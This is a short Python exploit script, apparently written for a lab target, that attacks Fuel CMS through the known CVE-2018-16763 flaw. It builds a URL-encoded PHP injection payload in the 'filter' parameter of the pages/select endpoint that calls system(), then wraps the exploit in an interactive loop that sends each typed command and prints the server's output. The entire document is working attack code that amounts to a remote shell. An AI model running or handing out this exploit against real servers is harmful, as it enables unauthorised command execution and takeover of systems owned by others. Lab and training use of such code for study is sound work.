import sys
import requests
from urllib.parse import quote

# Target configuration for AstraNode project lab
TARGET_URL = "http://10.49.130.90"

print(f"[*] Initializing Fuel CMS RCE exploit against: {TARGET_URL}")
print("[*] Type 'exit' to quit the interactive shell.\n")

while True:
    try:
        cmd = input("AstraNode-Shell$ ")
        if cmd.strip().lower() == "exit":
            print("[*] Closing shell session.")
            break
        if not cmd.strip():
            continue
        
        # Constructing the CVE-2018-16763 payload with URL encoding
        payload = f"/fuel/pages/select/?filter='%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{quote(cmd)}%27%29%2b%27"
        exploit_url = TARGET_URL + payload
        
        # Executing HTTP GET request to trigger RCE
        response = requests.get(exploit_url, timeout=30)
        
        # Displaying clean command output without cluttering HTML tags
        if response.status_code == 200:
            # Split the response and grab the clean text before the HTML markup starts
            raw_text = response.text
            if "<div" in raw_text:
                clean_output = raw_text.split("<div")[0].strip()
            else:
                clean_output = raw_text.strip()
            
            print(clean_output if clean_output else raw_text)
        else:
            print(f"[!] Error: Received HTTP status code {response.status_code}")
            
    except KeyboardInterrupt:
        print("\n[*] Operation aborted by user.")
        break
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
        break

